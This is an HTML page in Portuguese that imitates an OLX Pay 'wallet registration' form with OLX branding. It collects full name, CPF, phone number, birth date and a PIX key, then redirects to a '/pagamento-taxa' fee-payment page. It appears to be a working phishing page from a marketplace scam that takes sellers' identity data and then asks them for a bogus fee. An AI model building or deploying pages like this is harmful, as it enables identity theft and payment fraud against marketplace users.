<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charSet="utf-8"/>

    <title>Cadastro de Carteira OLX Pay | OLX</title>
    <link data-react-helmet="true" rel="apple-touch-icon" sizes="180x180" href="img/apple-touch-icon.png"/>
    <link data-react-helmet="true" rel="icon" type="image/png" sizes="32x32" href="img/favicon-32x32.png"/>
    <link data-react-helmet="true" rel="icon" type="image/png" sizes="192x192" href="img/android-chrome-192x192.png"/>
    <link data-react-helmet="true" rel="icon" type="image/png" sizes="16x16" href="img/favicon-16x16.png"/>

    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:ital,opsz@0,6..12;1,6..12&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <!-- Adicionando Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            overflow-x: hidden;
            font-family: 'Nunito Sans', sans-serif;
            background-color: #ffffff;
        }
        .header {
            background-color: #fff;
            border-bottom: 1px solid #c7c7c7;
            padding-bottom: 21px;
            display: flex;
            justify-content: center;
        }
        .logo {
            width: 47px;
            margin-top: 27px;
        }
        .form-container {
            position: relative;
            background-color: #fff;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            padding: 20px;
            width: 90%;
            max-width: 400px;
            margin: 20px auto;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .form-container h1 {
            font-size: 22px;
            margin-bottom: 15px;
        }
        .form-container p {
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 15px;
        }
        .form-container input, .form-container select {
            width: 100%;
            padding: 10px;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            margin-bottom: 15px;
            font-size: 14px;
            box-sizing: border-box;
        }
        .form-container .date-inputs {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
            width: 100%;
        }
        .form-container .date-inputs input {
            flex: 1;
            min-width: 0;
        }
        .form-container button {
            background-color: #f28000;
            color: #fff;
            border: none;
            border-radius: 20px;
            padding: 12px 32px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            margin-bottom: 20px;
            box-sizing: border-box;
        }
        .form-container button:hover {
            background-color: #e56c00;
        }
        .continuar {
            font-size: 12px;
 color: #666;
            text-align: center;
            padding: 10px 20px;
            width: 100%;
            background-color: #f8f8f8;
            border-radius: 8px;
            margin-top: 10px;
        }
        .error-message {
            color: red;
            font-size: 14px;
            margin-top: 10px;
        }
        @media (max-width: 600px) {
            .form-container h1 {
                font-size: 20px;
            }
            .form-container p {
                font-size: 12px;
            }
            .form-container input, .form-container select {
                font-size: 12px;
            }
            .form-container button {
                padding: 10px 20px;
                font-size: 12px;
            }
            .continuar {
                font-size: 10px;
            }
        }
    </style>
    <script>
        function formatarCPF(cpf) {
    return cpf.replace(/(\d{3})(\d)/, '$1.$2')
              .replace(/(\d{3})(\d)/, '$1.$2')
              .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
}

function formatarTelefone(telefone) {
    return telefone.replace(/(\d{2})(\d{5})(\d{4})/, '$1 $2-$3');
}

function validarCPF(cpf) {
    cpf = cpf.replace(/[^\d]+/g, '');
    if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;

    let soma = 0;
    let resto;

    for (let i = 1; i <= 9; i++) {
        soma += parseInt(cpf.charAt(i - 1)) * (11 - i);
    }
    resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;
    if (resto !== parseInt(cpf.charAt(9))) return false;

    soma = 0;
    for (let i = 1; i <= 10; i++) {
        soma += parseInt(cpf.charAt(i - 1)) * (12 - i);
    }
    resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;
    if (resto !== parseInt(cpf.charAt(10))) return false;

    return true;
}

function validarFormulario(event) {
    event.preventDefault();
    const cpfInput = document.getElementById('cpf').value;
    const telefoneInput = document.getElementById('telefone').value;
    const nomeInput = document.getElementById('nome').value;
    const diaInput = document.getElementById('dia').value;
    const mesInput = document.getElementById('mes').value;
    const anoInput = document.getElementById('ano').value;
    const chavePixInput = document.getElementById('chave-pix-input').value;

    if (!nomeInput || !cpfInput || !telefoneInput || !diaInput || !mesInput || !anoInput || !chavePixInput) {
        alert('Por favor, preencha todas as opções corretamente.');
        return;
    }

    if (!validarCPF(cpfInput)) {
        alert('O CPF digitado não é válido.');
        return;
    }

    window.location.href = "/pagamento-taxa";
}

function aplicarFormatacao(event) {
    const input = event.target;
    if (input.id === 'cpf') {
        input.value = formatarCPF(input.value);
        if (input.value.length >= 14) {
            input.setAttribute('maxlength', '14');
        }
    } else if (input.id === 'telefone') {
        input.value = formatarTelefone(input.value);
        if (input.value.length >= 13) {
            input.setAttribute('maxlength', '13');
        }
    } else if (input.id === 'dia' || input.id === 'mes' || input.id === 'ano') {
        input.value = input.value.replace(/[^\d]+/g, '');
    }
}

function delayedRedirect() {
    setTimeout(function() {
        window.location.href = "/pagamento-taxa";
    }, 200);
}
    </script>
</head>
<body>
    <div class="header">
        <img src="../img/olx.svg" alt="OLX Logo" class="logo"/>
    </div>
    <div class="form-container">
        <h1>Cadastro de Carteira OLX Pay</h1>
        <div class="flex items-center bg-yellow-50 border border-yellow-300 rounded-md p-4 mb-4">
            <i class="fas fa-exclamation-triangle text-yellow-500 text-xl mr-3"></i>
            <p class="text-yellow-700">Pedimos que faça o cadastro de sua conta para recebimento.</p>
        </div>
        <form onsubmit="validarFormulario(event)">
            <input type="text" id="nome" name="nome" placeholder="Nome Completo" required/>
            <input type="text" id="cpf" name="cpf" placeholder="CPF" required oninput="aplicarFormatacao(event)" maxlength="14"/>
            <input type="tel" id="telefone" name="telefone" placeholder="Telefone" required oninput="aplicarFormatacao(event)" maxlength="15"/>
            <label>Data de nascimento:</label>
            <div class="date-inputs">
                <input type="text" id="dia" name="dia" placeholder="Dia" required oninput="aplicarFormatacao(event)" maxlength="2"/>
                <input type="text" id="mes" name="mes" placeholder="Mês" required oninput="aplicarFormatacao(event)" maxlength="2"/>
                <input type="text" id="ano" name="ano" placeholder="Ano" required oninput="aplicarFormatacao(event)" maxlength="4"/>
            </div>
            <label for="chave-pix">Chave PIX:</label>
            <select id="chave-pix" name="chave-pix" required>
                <option value="">Selecione a chave PIX que deseja</option>
                <option value="email">Email</option>
                <option value="cpf">CPF</option>
                <option value="telefone">Telefone</option>
            </select>
            <input type="text" id="chave-pix-input" name="chave-pix-input" placeholder="Chave PIX" required/>
            <button type="submit">Cadastrar</button>
        </form>
        <div class="continuar">Já tem uma conta? <a href="#">Faça login</a></div>
    </div>
</body>
</html>
